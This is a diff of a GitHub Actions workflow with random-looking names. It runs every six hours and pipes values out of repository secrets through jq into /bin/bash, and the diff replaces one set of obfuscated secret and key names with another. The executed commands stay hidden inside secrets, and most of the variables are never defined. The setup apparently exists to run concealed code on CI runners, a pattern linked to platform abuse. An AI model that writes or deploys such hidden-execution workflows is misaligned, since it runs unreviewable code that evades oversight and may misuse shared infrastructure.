@@ -1,27 +1,29 @@
 name: jinweixiang9012
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 4/6 * * *'
-
+    - cron: '21 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jinweixiang9012
         env:
-          sa078: ${{ secrets.sa078 }}
+          ysqh0600: ${{ secrets.ysqh0600 }}
         run: |
-          echo $sa078 | jq -r .bi4 | /bin/bash
-          echo $lwmgd89796 | jq -r .h6 | /bin/bash
-          echo $oq78 | jq -r .qlj450 | /bin/bash
-          echo $t8 | jq -r .tmwd29653 | /bin/bash
-          echo $ujldc37244 | jq -r .fbhgk8 | /bin/bash
-          echo $ri272 | jq -r .aahds702 | /bin/bash
-          echo $bjuz52 | jq -r .jomb49341 | /bin/bash
-          echo $qaj587 | jq -r .dvopb16 | /bin/bash
-          echo $gaae19418 | jq -r .jybxb3 | /bin/bash
-          echo $q14 | jq -r .gdx67 | /bin/bash
-          echo $t7 | jq -r .rfane21646 | /bin/bash
+          echo $ysqh0600 | jq -r .xalmb865 | /bin/bash
+          echo $gs365 | jq -r .g8336 | /bin/bash
+          echo $qt13525 | jq -r .mbmxq255 | /bin/bash
+          echo $ytrgn08589 | jq -r .p9 | /bin/bash
+          echo $esqvs8500 | jq -r .rd293 | /bin/bash
+          echo $azq8 | jq -r .div67 | /bin/bash
+          echo $x9947 | jq -r .ei72860 | /bin/bash
+          echo $i639 | jq -r .ld3313 | /bin/bash
+          echo $xig8141 | jq -r .cpsw77271 | /bin/bash
+          echo $g87100 | jq -r .cvmq64021 | /bin/bash
+          echo $enoip321 | jq -r .uf7 | /bin/bash
+          echo $k21 | jq -r .bb01 | /bin/bash
 
